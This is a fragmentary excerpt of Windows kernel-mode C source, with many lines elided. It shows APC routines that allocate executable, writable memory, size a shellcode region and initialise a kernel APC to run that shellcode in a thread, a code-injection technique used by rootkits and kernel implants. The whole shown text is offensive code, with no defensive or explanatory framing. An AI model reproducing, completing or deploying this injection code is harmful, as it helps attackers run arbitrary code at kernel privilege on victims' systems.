...
#define MAX_SHELLCODE_SIZE 10000000
...
!*/
D_SEC(D)
VOID NTAPI ApcNormalRoutine(_In_ PVOID NormalContext, _In_ PVOID SystemArgument1, _In_ PVOID SystemArgument2)
{
	API Api;
	SIZE_T Len = 0;
	...
	Len = (SIZE_T)((uintptr_t)GetIp() + 11 - (uintptr_t)G_PTR(UmEnt));
	...
	if (NT_SUCCESS(Api.ZwAllocateVirtualMemory(NtCurrentProcess(), &Ptr, 0, &(SIZE_T){Len}, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)))
	{
		...
		if (Len > 0 && Len < MAX_SHELLCODE_SIZE)
		{
		...
		if ((Apc = Api.ExAllocatePool(NonPagedPool, sizeof(KAPC))) != NULL)
		{
			...
			Api.KeInitializeApc(Apc,
								(PRKTHREAD)Api.PsGetCurrentThread(),
								CurrentApcEnvironment,
...
!*/
D_SEC(D)
VOID NTAPI ApcKernelRoutine(_In_ PRKAPC Apc, _In_ PVOID *NormalRoutine, _In_ PVOID *NormalContext, _In_ PVOID *SystemArgument1, _In_ PVOID *SystemArgument2)
{
	API Api;
	PKMTBL Tbl = NULL;
